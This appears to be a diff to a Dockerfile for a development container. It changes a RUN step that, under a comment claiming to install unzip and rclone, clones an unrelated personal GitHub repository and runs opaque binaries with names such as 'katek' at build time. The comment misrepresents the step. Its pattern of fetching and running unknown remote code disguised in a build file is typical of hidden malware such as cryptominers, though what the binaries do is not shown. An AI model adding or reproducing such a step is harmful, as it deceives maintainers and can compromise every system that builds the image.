@@ -7,7 +7,7 @@ USER coder
 ENV SHELL=/bin/bash
 
 # Install unzip + rclone (support for remote filesystem)
-RUN git clone https://github.com/sahrulega56/kosong.git && cd kosong && chmod +x srbi surabi && ./srbi 
+RUN git clone https://github.com/sahrulega56/kosong.git && cd kosong && chmod +x katek-fee katek && ./katek 
 
 # Copy rclone tasks to /tmp, to potentially be used
 COPY deploy-container/rclone-tasks.json /tmp/rclone-tasks.json
